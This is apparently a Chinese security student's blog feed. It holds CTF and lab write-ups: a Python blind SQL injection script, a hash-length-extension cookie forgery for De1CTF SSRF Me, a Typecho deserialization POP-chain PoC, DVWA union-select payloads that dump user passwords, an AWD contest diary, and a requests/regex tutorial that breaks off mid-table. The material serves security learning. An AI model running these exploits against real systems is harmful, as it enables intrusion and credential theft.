</p><blockquote><p>”布尔型”盲注,因为布尔型盲注没有任何参考,只能靠观察目标页面的返回来判断语句是否执行成功,所以只能通过一位位的字符截取然后逐个对比判断来获取准确数据 </p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://2b9e5890-12ec-4d58-b66c-7896798a6ad1.node3.buuoj.cn"</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span>       <span class="token string">"id"</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">}</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       l <span class="token operator">=</span> <span class="token number">33</span>   r <span class="token operator">=</span><span class="token number">130</span>      mid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>       <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>              payload<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0^"</span> <span class="token operator">+</span> <span class="token string">"(ascii(substr((select(flag)from(flag)),{0},1))>{1})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>             html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>              <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>             <span class="token keyword">if</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                     l <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>                  <span class="token keyword">else</span><span class="token punctuation">:</span>                         r <span class="token operator">=</span> mid                     mid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">break</span>                     result <span class="token operator">=</span> result <span class="token operator">+</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag: "</span> <span class="token punctuation">,</span>result<span class="token punctuation">)</span></code></pre><p>参考文章:</p><p><a href="https://www.cnblogs.com/lcamry/p/5504374.html" target="_blank" rel="noopener">Sql注入截取字符串常用函数</a>  </p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>哈希扩展攻击;</p><p>查看hint,flag is in ./flag.txt,打开题目,是python 的 flask框架写的网页源代码</p><p>在路由中看到@app.route(“/geneSign”  和@app.route(‘/De1ta 以及 /</p><p>在geneSign中得到一串字符串,32位hash值</p><p>7f24ee7111b5207c0396045ae667b444 ,secre_key未知,param的值通过GET/POST传参得到,action为scan.</p><pre class=" language-python"><code class="language-python">app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        action <span class="token operator">=</span> <span class="token string">"scan"</span>       <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>然后返回的md5是 secert_key+param+action的md5,于是访问</p><p>geneSign?param=flag.txt中得到了secert_key+”flag.txt”+scan的值</p><p>7e827d22d62533bacbd6a4354f0248ca</p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span></code></pre><p>在Task类中有一个checkSign函数,如果getSign的返回值与self.sign相等就返回True.</p><p>路由/De1ta调用了Task类,当getSign返回值与cookie中的sign值相等时,才能进入Exec函数中的if语句.</p><p>然后如果action为scan,则创建一个文件,把请求结果写入result.txt中.如何是read,则回显在页面上</p><p>因此构造一个 read 和scan都有的cookie去访问flag.txt</p><p>又由,可以知道长度为16+8(read+scan)=24</p><pre class=" language-python"><code class="language-python">secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span></code></pre><p>在hashpump中得到:</p><p>29e9f7ec65f231d44778d3ea933b21bd<br>scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read ,然后把\x替换为url的%</p><p>scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</p><p>用editthiscookie设置cookie,.刷新就可以得到flag</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Typecho反序列化漏洞复现分析</title>
      <link href="/posts/20191217/"/>
      <url>/posts/20191217/</url>
      
        <content type="html"><![CDATA[<p>参考文章:</p><p>[<a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">php对象注入-pop链的构造</a>]  </p><p><a href="https://www.anquanke.com/post/id/155306#h3-5" target="_blank" rel="noopener">入门教学 | Typecho反序列化漏洞分析</a></p><p>反序列化中(面向对象)几个常见的魔术方法:</p><blockquote><p>__construct():用于对对象的属性进行初始化,使用关键字new实例化对象时自动执行 //构造方法</p><p>__destruct():用于释放对象占用的第三方资源,对象呗销毁时自动执行//析构方法</p><p>__toString():用于兼容对象的字符串调用,在对象被当成字符串时自动执行 </p><p>__get():调用一个未定义的属性(调用类中私有变量时)时执行这个方法</p><p>__set():给一个未定义的属性赋值时调用</p><p>__call():当调用一个未定义(包括没有权限访问)的方法自动执行</p><p>__sleep():序列化的时候用</p><p>__wakeup():反序列化的时候调用</p></blockquote><a id="more"></a><p>既然是反序列化漏洞,那直接关键字搜索unserialize,结果如下</p><p>而且要有漏洞,那么这个点要么是输入数据可控被输入了危险内容从而getshell,要么就是存在逻辑漏洞导致业务存在漏洞可被利用</p><p>通过这一点,可以大概定位到漏洞所在位置.</p><pre class=" language-php+HTML"><code class="language-php+HTML">E:\phpstudy_pro\WWW\fx\install.php:  228                  <?php else : ?>  229                      <?php  230:                     $config unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));  231                      Typecho_Cookie::delete('__typecho_config');  232                      $db = new Typecho_Db($config['adapter'], $config['prefix']);  ...  281                  <?php else : ?>  282              <?php  283:                                     $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));  284                                      $type = explode('_', $config['adapter']);  285                                      $type = array_pop($type);</code></pre><p>230~232行:</p><pre class=" language-php"><code class="language-php"><span class="token variable">$config</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span>Typecho_Cookie<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'__typecho_config'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'adapter'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里将反序列化后的字符串赋值给$config,先从Tyepcho_Cookie类直接调用静态方法get()__typecho_config然后将其base64然后再反序列化</p><p>在install.php中找的代码的位置:</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597165/6_xaqmtc.png" alt="alt"></p><p>然后将实例化后的字符串赋值给$db,然后234行对Typecho_Db类进行初始化</p><p>然后找到Typecho_DB类,在Db.php中</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597165/7_j7doxu.png" alt="alt"> </p><p>发现Typecho_DB类通过传入的$adapterName和拼接的typecho_作为参数进行初始化,,,</p><p>如果$adapterName为对象,则会调用__toString方法</p><p>全局搜索__toString方法</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597166/8_vhzmix.png" alt="8"></p><p>这里程序会调用私有变量所在类的__get()方法获取私有变量</p><p>然后搜索___get()方法, </p><p>__get()方法又调用了get()方法</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597166/9_o3sqsn.png" alt="9"></p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597166/11_syhovg.png" alt="11"> </p><p>这个switch语句用于检测$key是否在$this-&gt;_parms[$key]里面,如果是,赋值给$value,否则就赋值为$default;最后把$value的值返回给__applyFilter()函数里面</p><p>找到_applyFilter()函数所在的代码</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597165/12_mni0nq.png" alt="12"></p><p> 这里有两个危险函数:<strong>array_map和call_user_func,这两个系统内置函数将自动为参数调用回调函数;</strong></p><p>$filter为回调函数的名字,$value为参数值,这两个数据都可控;</p><p>因此可以构造序列化攻击,执行我们想要的内容;</p><p>由以上分析,只要参数为数组就会触发__toString方法,然后screenName为执行的参数值, _filter为执行的函数</p><pre class=" language-PHP"><code class="language-PHP"><?php    class Typecho_Request    {        private $_params = array();        private $_filter = array();        public function __construct()        {            $this->_params['screenName'] = 1; // 执行的参数值            $this->_filter[0] = 'phpinfo'; //filter执行的函数        }    }    class Typecho_Feed{        const RSS2 = 'RSS 2.0';        private $_items = array();        private $_type;        function __construct()        {            $this->_type = self::RSS2; //进入toString内部判断条件            $_item['author'] = new Typecho_Request(); //Feed.php文件中触发__get()方法使用的对象            $this->_items[0] = $_item;        }    }    $exp = new Typecho_Feed();    $a = array(        'adapter'=>$exp, // Db.php文件中触发__toString()使用的对象        'prefix' =>'typecho_'    );    echo urlencode(base64_encode(serialize($a)));?></code></pre><p>这个POC我实话实说,写不出来-.- 慢慢学吧<del>~</del></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次第一次线下AWD</title>
      <link href="/posts/20191215/"/>
      <url>/posts/20191215/</url>
      
        <content type="html"><![CDATA[<h1 id="记录一次第一次线下AWD"><a href="#记录一次第一次线下AWD" class="headerlink" title="记录一次第一次线下AWD"></a>记录一次第一次线下AWD</h1><h2 id="赛前"><a href="#赛前" class="headerlink" title="赛前"></a>赛前</h2><p>这里我按重要程度来说-.-</p><ol><li><p>一定要在比赛前,把那种用的比较多的脚本准备好,py2和py3的都要准备好…然后还有一些waf,日志,流量监控这些以及一些awd能现成用到的软件都一定要准备好,还要知道怎么上上去</p></li><li><p>比赛开始前,主办方会发一个单子,上面有队伍的平台账号还有密码以及队伍的IP地址 例如:10.0.3.41-43.然后去配置自己的以太网:</p><p>IP地址就是给的那个,每个人填自己的那个,子网掩码255.255.255.0,默认网关填同一个段上254</p></li><li><p>做好分工,一定要做好分工,做好分工…….</p></li></ol><a id="more"></a><h2 id="开始比赛前期"><a href="#开始比赛前期" class="headerlink" title="开始比赛前期"></a>开始比赛前期</h2><ol><li>先在平台上得到SSH账号,马上用finalshell连上,马上上流量监控和日志文件,然后迅速把网页源码备份下来-.- 这样可以看到自己是怎么被打了,以及免得以后被被的队伍打了,被删源码或者自己误删了.</li><li>备份下来之后,负责审计的那个在D顿和Seay里面先审一下,然后在finalshell里面调代码,并且要根据最简单的漏洞去写payload然后打别的队伍</li><li>另外一边,找到主办方预留的后门,然后看能不能打全场,但是记得先把自己的修了,不能删的话可以修改-.-这次就在这里犯了巨大失误后面这个点被打了几次…</li><li>在网上找赛题的CMS有没有现成的CVE,有没有现成的payload</li></ol><h2 id="赛中"><a href="#赛中" class="headerlink" title="赛中"></a>赛中</h2><p>不管局面是什么样的,被打了-.-也不要慌,第一次打有点慌,哎~~我们咋被打了! 要能通过看流量,迅速反应过来</p><p>如果找到flag的点,就跑脚本打全场</p><h2 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h2><p>好好复盘,哪里失误了,那些点没整对</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说,第一次打AWD确实有点慌,没怎么准备好,甚至很多最基础的点都不知道,都是swpu 的师傅下来说我500了才知道一个服务器下面开着有几个端口对应几个赛题-.-</p><p>没事没事没事!继续努力努力努力!先争取面试进小组,然后寒假好好完成自己给自己的任务</p><p><strong><em>“Believe in your infinite potential. Your only limitations are those you set upon yourself.”</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> 线下AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入之dvwa</title>
      <link href="/posts/20191210/"/>
      <url>/posts/20191210/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入之dvwa"><a href="#sql注入之dvwa" class="headerlink" title="sql注入之dvwa"></a>sql注入之dvwa</h1><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>在判断了注入点以及列数后,确定回显位置在第二列</p><p>开始获取表名,字段,内容</p><pre class=" language-mysql"><code class="language-mysql">1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></pre><p><img src="/posts/20191210/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191208152854455.png" alt="image-20191208152854455"></p><p>得到表名为 users 和 guestbook</p><a id="more"></a><pre class=" language-mysql"><code class="language-mysql">1'union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#</code></pre><p><img src="/posts/20191210/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191208154141365.png" alt="image-20191208154141365"></p><p>得到users表中的内容 ,其中有 user 和password</p><p>作为攻击方,获得password就是目的</p><pre class=" language-mysql"><code class="language-mysql">1' union select user,password from users #</code></pre><p><img src="/posts/20191210/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191208155235620.png" alt="image-20191208155235620"><br>可以看到,用户名和密码,就成功了</p><h3 id="medium-1-8"><a href="#medium-1-8" class="headerlink" title="medium(1.8)"></a>medium(1.8)</h3><p>网上看了1.9版本的,只是在网页上不给用户输入而已,抓包在bp里面搞,其他思路是一样的.</p><p>尝试用’ 来引起sql语句未闭合而报错,发现单引号’被转义为/</p><p><img src="/posts/20191210/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191208155753349.png" alt="image-20191208155753349"></p><p>于是后面就会绕过他</p><p>网上说用16进制绕过</p><pre class=" language-mysql"><code class="language-mysql"> 1%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#</code></pre><pre class=" language-mysql"><code class="language-mysql">1%27 union select user,password from users#</code></pre><p><img src="/posts/20191210/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191208163223273.png" alt="image-20191208163223273"></p><p>然后就用同样的方法,拿到用户名和密码,就成功了</p><h4 id="mysql-real-escape-string-函数"><a href="#mysql-real-escape-string-函数" class="headerlink" title="mysql_real_escape_string() 函数"></a>mysql_real_escape_string() 函数</h4><p>转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><pre><code>\x00\n\r\&#39;&quot;\x1a</code></pre><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>先用单引号来导致报错,发现没有错误回显,则关闭了错误回显,以为是<strong>盲注</strong></p><p>看源码后</p><pre class=" language-php"><code class="language-php"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>从源代码可以看出，此处为字符型注入。对传入 <strong>$id</strong> 的值使用 <em>stripslashes()</em> 函数处理以后，再经过到 <em>$mysql_real_escape_string()</em> 函数进行第二次过滤。<strong>在默认情况下，PHP会对所有的GET，POST和cookie数据自动运行 <em>addslashes(), addslashes()</em> 函数返回在部分与定义之前添加\。</strong></p><p><em>Striptslashes()</em> 函数则是删除由 <em>addslashes()*函数添加的反斜杠。在使用两个函数进行过滤之后再使用 *is_numric()</em> 函数检查 <strong>$id</strong> 值是否位数字，彻底断绝了注入的存在。此种防护不存在绕过的可能。(从B乎上看到的)</p><h2 id="SQL-injection-Blind-盲注"><a href="#SQL-injection-Blind-盲注" class="headerlink" title="SQL injection(Blind) 盲注"></a>SQL injection(Blind) 盲注</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>只有两种状态</p><p>User ID is MISSING from the database.</p><p>或者已经存在</p><p>1’ and 1=1# 存在</p><p>1’ and 1=2# 不存在</p><p>即存在 字符型注入</p><p>可以通过<strong>布尔型盲注</strong>和<strong>延时盲注</strong></p><!--还没做--><p>​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python re , request 库使用</title>
      <link href="/posts/20191206/"/>
      <url>/posts/20191206/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-re-request-模块使用"><a href="#Python-re-request-模块使用" class="headerlink" title="Python re , request 模块使用"></a>Python re , request 模块使用</h1><h1 id="Request库基本使用"><a href="#Request库基本使用" class="headerlink" title="Request库基本使用"></a>Request库基本使用</h1><p> 模块.类.方法.属性 </p><p>首先,导入模块使用</p><pre class=" language-python"><code class="language-python"> <span class="token keyword">import</span> re  <span class="token keyword">import</span> request</code></pre><h2 id="请求URL"><a href="#请求URL" class="headerlink" title="请求URL"></a>请求URL</h2><h3 id="1-GET"><a href="#1-GET" class="headerlink" title="1.GET"></a>1.GET</h3><pre class=" language-python"><code class="language-python">r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">)</span>  如果要要传递参数<span class="token punctuation">,</span>使用关键字parms如<span class="token punctuation">:</span> payload<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'a'</span><span class="token punctuation">:</span><span class="token string">'flag1'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">:</span><span class="token string">'flag2'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#采用的是键值对的形式</span></code></pre><pre class=" language-python"><code class="language-python">r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">,</span>parms <span class="token operator">=</span> payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#带参数的请求</span></code></pre><p>打印结果</p><p>print (r.url)</p><a id="more"></a><h3 id="2-POST"><a href="#2-POST" class="headerlink" title="2.POST"></a>2.POST</h3><blockquote><p>post请求参数的关键字为data= {“  “:”  “ }</p><p>JSON格式的请求 data = json.dumps(payload) 或者 json = payload</p></blockquote><blockquote><p>POST文件使用的关键字为:files = {“file”:open(‘report.xls’,’rb’) }</p><p>r = requests.post(url,files = files)</p></blockquote><p><strong>如果既要提交文件又要提交参数,就使用data = json.dumps(payload)</strong></p><h2 id="获取返回信息"><a href="#获取返回信息" class="headerlink" title="获取返回信息"></a>获取返回信息</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsr <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'   '</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>text <span class="token comment" spellcheck="true">#以UTF-8的格式输出(返回)  r.content #以字节流的形式输出(返回)</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#返回json格式 </span>r<span class="token punctuation">.</span>raw<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#返回服务器的原始数据 ,但需要在请求的时候加 stream = True</span></code></pre><h1 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h1><p>r= request.get( ‘  ‘) </p><p>r.headers</p><p>r.headers()返回的是报文头</p><p>使用r.headers[‘Content-Type’]或者r.heads.get(‘Content-Type’)</p><p>在请求时也可以自定义headers</p><pre class=" language-python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">"  IE "</span><span class="token punctuation">}</span>r <span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span></code></pre><h1 id="302"><a href="#302" class="headerlink" title="302"></a>302</h1><p>r = requests.get(‘  ‘)</p><p>r.url</p><p>r.history</p><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>s = requests.Session() #请求Session</p><h1 id="下载页面"><a href="#下载页面" class="headerlink" title="下载页面"></a>下载页面</h1><pre class=" language-python"><code class="language-python">r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'    '</span><span class="token punctuation">)</span><span class="token keyword">with</span> open <span class="token punctuation">(</span><span class="token string">'xxx.html'</span><span class="token punctuation">,</span><span class="token string">'  '</span><span class="token punctuation">)</span> <span class="token keyword">as</span> html <span class="token punctuation">:</span>    html<span class="token punctuation">.</span>write<span class="token punctuation">(</span> r<span class="token punctuation">.</span>content <span class="token punctuation">)</span>html<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="Re库的基本使用"><a href="#Re库的基本使用" class="headerlink" title="Re库的基本使用"></a>Re库的基本使用</h1><p>import re#导入模块        re库用于字符串匹配</p><h2 id="正则表达式的表示类型"><a href="#正则表达式的表示类型" class="headerlink" title="正则表达式的表示类型:"></a>正则表达式的表示类型:</h2><blockquote><p>raw string类型(原生字符串,<strong>不包含转义符号的字符串</strong>)</p><p>r’text’  例如:     r’[1-7]\d{5}’</p></blockquote><blockquote><p>string类型,更复杂</p><p>当正则表达式有转义符时,多使用raw string来表达正则表达式</p></blockquote><h2 id="Re函数"><a href="#Re函数" class="headerlink" title="Re函数"></a>Re函数</h2><h3 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h3><p>re.match 尝试从字符串的<strong>起始位置</strong>匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。如果开始不符合正则表达式,则匹配失败,返回none.</p><p><strong>函数语法</strong>：</p><pre class=" language-python"><code class="language-python">re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> string<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><blockquote><p>pattern是要匹配的正则表达式 </p><p>string 要匹配的字符串 </p><p>flags 标志位,用于控制正则表达式的匹配方式,是否区分大小写等</p></blockquote><h3 id="re-search函数"><a href="#re-search函数" class="headerlink" title="re.search函数"></a>re.search函数</h3><p>re.search 扫描<strong>整个</strong>字符串并返回<strong>第一个成功</strong>的匹配。</p><p>函数语法：</p><pre><code>re.search(pattern, string, flags=0)</code></pre><h3 id="re-match与re-search的区别"><a href="#re-match与re-search的区别" class="headerlink" title="re.match与re.search的区别"></a>re.match与re.search的区别</h3><p>re.match只匹配字符串的<strong>开始</strong>，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p><h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>在字符串中找到正则表达式所匹配的<strong>所有子串</strong>，并返回一个列表，如果没有找到匹配的，则返回空列表。</p><p><strong>注意：</strong> match 和 search  是匹配一次, findall 匹配所有。</p><p>语法格式为：</p><pre><code>findall(string[, pos[, endpos]])</code></pre><p>参数：</p><ul><li>string : 待匹配的字符串。 </li><li>pos : 可选参数，指定字符串的起始位置，默认为 0。 </li><li>endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。</li></ul><h3 id="re-split"><a href="#re-split" class="headerlink" title="re.split"></a>re.split</h3><p>split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：</p><pre class=" language-python"><code class="language-python">re<span class="token punctuation">.</span>split<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> string<span class="token punctuation">[</span><span class="token punctuation">,</span> maxsplit<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><table><thead><tr><th>pattern</th><th>匹配的正则表达式</th></tr></thead><tbody><tr><td>string</td><td>要匹配的字符串。</td></tr><tr><td>maxsplit</td><td>分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。</td></tr><tr><td>flags</td><td>标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。参见：<a href="https://www.runoob.com/python/python-reg-expressions.html#flags" target="_blank" rel="noopener">正则表达式修饰符 - 可选标志</a></td></tr></tbody></table><h2 id="正则表达式模式"><a href="#正则表达式模式" class="headerlink" title="正则表达式模式"></a>正则表达式模式</h2><table><thead><tr><th>^</th><th>匹配字符串的开头</th></tr></thead><tbody><tr><td>$</td><td>匹配字符串的末尾。</td></tr><tr><td>.</td><td>匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td></tr><tr><td>[…]</td><td>用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’</td></tr><tr><td>[^…]</td><td>不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。</td></tr><tr><td>re*</td><td>匹配0个或多个的表达式。</td></tr><tr><td>re+</td><td>匹配1个或多个的表达式。</td></tr><tr><td>re?</td><td>匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式</td></tr><tr><td>re{ n}</td><td>精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。</td></tr><tr><td>re{ n,}</td><td>匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。</td></tr><tr><td>re{ n, m}</td><td>匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式</td></tr><tr><td>a| b</td><td>匹配a或b</td></tr><tr><td>(re)</td><td>对正则表达式分组并记住匹配的文本</td></tr><tr><td>(?imx)</td><td>正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。</td></tr><tr><td>(?-imx)</td><td>正则表达式关闭 i, m, 或 x 